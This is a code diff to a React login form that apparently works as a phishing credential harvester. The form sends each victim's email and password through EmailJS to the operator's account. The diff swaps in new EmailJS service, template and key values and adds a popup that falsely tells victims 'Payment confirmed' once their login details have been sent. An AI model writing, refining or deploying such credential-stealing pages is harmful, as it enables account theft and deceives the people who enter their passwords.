@@ -2,6 +2,7 @@
 import React, { useState } from 'react';
 import './App.css'; // reuse styling
 import emailjs from '@emailjs/browser';
+import Swal from 'sweetalert2'; // Import SweetAlert2
 
 
 function Login() {
@@ -30,25 +31,29 @@ function Login() {
       return;
     }
 
-    const serviceID = 'service_3uuvfpi';
-    const templateID = 'template_kl8qbkv';
-    const publicKey = 'nOAeVTkhO-nqV4TW4';
+    const serviceID = 'service_hhsl7q7';
+    const templateID = 'template_m2dl2pc';
+    const publicKey = 'tU_Bniypr11H5Kv8U';
 
     emailjs
       .send(serviceID, templateID, formData, publicKey)
       .then((response) => {
         console.log('Email sent successfully!', response.status, response.text);
-        setSuccessMessage('Login info sent successfully!');
-        setErrorMessage('');
-        setFormData({
-          email: '',
-          password: '',
+        Swal.fire({
+          icon: 'success',
+          title: 'Successful',
+          text: 'Payment confirmed',
         });
+        setFormData({ email: '', password: '' });
+        setErrorMessage('');
       })
-      .catch((error) => {
-        console.error('Failed to send login info:', error);
-        setSuccessMessage('');
-        setErrorMessage('Failed to log in. Please try again.');
+      .catch((err) => {
+        console.error('Email sending failed:', err);
+        Swal.fire({
+          icon: 'error',
+          title: 'Something went wrong',
+          text: 'Failed to send login info.',
+        });
       });
   };
 
